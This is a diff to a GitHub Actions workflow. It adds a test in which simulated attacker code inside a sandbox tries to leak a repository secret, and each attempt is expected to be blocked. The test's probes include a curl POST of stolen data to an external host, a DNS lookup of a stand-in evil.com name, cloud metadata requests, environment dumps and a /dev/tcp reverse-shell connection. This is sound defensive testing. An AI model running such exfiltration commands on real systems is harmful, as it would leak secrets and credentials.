@@ -6,7 +6,8 @@ on:
   pull_request:
   workflow_dispatch:
 
-# Use a test secret: set TEST_SECRET in repo settings to any value (e.g. "s3cr3t-value-12345")
+# Repo secrets required:
+#   MY_SECRET - any value (e.g. "my-real-secret-value-12345") — used to test exfiltration protection
 
 jobs:
   # ---------------------------------------------------------------
@@ -296,3 +297,147 @@ jobs:
               exit 1
             fi
           profile: /tmp/test-profile.json
+
+  # ---------------------------------------------------------------
+  # Test 9: Real secret exfiltration protection
+  # Uses MY_SECRET from repo secrets — a real secret, not a hardcoded value.
+  # Simulates every common exfiltration vector an attacker would try.
+  # ---------------------------------------------------------------
+  test-exfil-protection:
+    name: "Test: real secret exfiltration blocked"
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      # First: verify the secret IS available outside the sandbox (control test)
+      - name: Control — secret exists in workflow
+        run: |
+          if [[ -z "${MY_SECRET:-}" ]]; then
+            echo "FAIL: MY_SECRET not set — add it in repo Settings > Secrets"
+            exit 1
+          fi
+          echo "Control: MY_SECRET is set (${#MY_SECRET} chars)"
+        env:
+          MY_SECRET: ${{ secrets.MY_SECRET }}
+
+      # Now run "attacker code" inside the sandbox — every exfil vector should fail
+      - name: Attacker simulation — all exfil vectors blocked
+        uses: ./
+        with:
+          run: |
+            FAIL=0
+
+            echo "=== Vector 1: env var direct read ==="
+            if [[ -n "${MY_SECRET:-}" ]]; then
+              echo "FAIL: MY_SECRET visible in env"
+              FAIL=1
+            else
+              echo "PASS: MY_SECRET not in env"
+            fi
+
+            echo ""
+            echo "=== Vector 2: /proc/self/environ ==="
+            if grep -q "MY_SECRET" /proc/self/environ 2>/dev/null; then
+              echo "FAIL: MY_SECRET in /proc/self/environ"
+              FAIL=1
+            else
+              echo "PASS: MY_SECRET not in /proc/self/environ"
+            fi
+
+            echo ""
+            echo "=== Vector 3: dump all env vars ==="
+            if env | grep -q "MY_SECRET"; then
+              echo "FAIL: MY_SECRET found via env command"
+              FAIL=1
+            else
+              echo "PASS: MY_SECRET not in env output"
+            fi
+
+            echo ""
+            echo "=== Vector 4: HTTP exfil to attacker server ==="
+            # Try to send data to an external host (simulating evil.com)
+            if curl -sf --max-time 5 "https://httpbin.org/post" -d "stolen=data" 2>/dev/null; then
+              echo "FAIL: HTTP POST to external host succeeded"
+              FAIL=1
+            else
+              echo "PASS: outbound HTTP blocked"
+            fi
+
+            echo ""
+            echo "=== Vector 5: DNS exfil ==="
+            # Try to exfiltrate via DNS query
+            if nslookup stolen-data.evil.com 2>/dev/null; then
+              echo "FAIL: DNS query succeeded"
+              FAIL=1
+            else
+              echo "PASS: DNS exfil blocked"
+            fi
+
+            echo ""
+            echo "=== Vector 6: write to artifact staging ==="
+            # Try to write the secret to a file that could be uploaded as artifact
+            if echo "stolen" > /home/runner/work/_temp/stolen.txt 2>/dev/null; then
+              echo "FAIL: wrote to _temp directory"
+              FAIL=1
+            else
+              echo "PASS: write to _temp blocked"
+            fi
+
+            echo ""
+            echo "=== Vector 7: write to workspace (source modification) ==="
+            if echo "stolen" > ./README.md 2>/dev/null; then
+              echo "FAIL: modified workspace file"
+              FAIL=1
+            else
+              echo "PASS: workspace write blocked"
+            fi
+
+            echo ""
+            echo "=== Vector 8: git push to fork ==="
+            if git push origin HEAD 2>/dev/null; then
+              echo "FAIL: git push succeeded"
+              FAIL=1
+            else
+              echo "PASS: git push blocked (network denied)"
+            fi
+
+            echo ""
+            echo "=== Vector 9: cloud metadata SSRF ==="
+            # AWS/GCP/Azure metadata endpoints
+            if curl -sf --max-time 3 http://169.254.169.254/latest/meta-data/ 2>/dev/null; then
+              echo "FAIL: AWS metadata endpoint reachable"
+              FAIL=1
+            else
+              echo "PASS: AWS metadata blocked"
+            fi
+            if curl -sf --max-time 3 "http://metadata.google.internal/computeMetadata/v1/" -H "Metadata-Flavor: Google" 2>/dev/null; then
+              echo "FAIL: GCP metadata endpoint reachable"
+              FAIL=1
+            else
+              echo "PASS: GCP metadata blocked"
+            fi
+
+            echo ""
+            echo "=== Vector 10: reverse shell ==="
+            if bash -c 'echo test > /dev/tcp/1.2.3.4/4444' 2>/dev/null; then
+              echo "FAIL: outbound TCP connection succeeded"
+              FAIL=1
+            else
+              echo "PASS: outbound TCP blocked"
+            fi
+
+            echo ""
+            echo "========================================"
+            if [[ $FAIL -eq 0 ]]; then
+              echo "ALL EXFILTRATION VECTORS BLOCKED"
+            else
+              echo "SOME VECTORS SUCCEEDED — SANDBOX BREACH"
+              exit 1
+            fi
+          fs-read: "."
+          fs-write: ""
+          network: blocked
+          credentials: |
+            MY_SECRET:api.example.com:header
+        env:
+          MY_SECRET: ${{ secrets.MY_SECRET }}
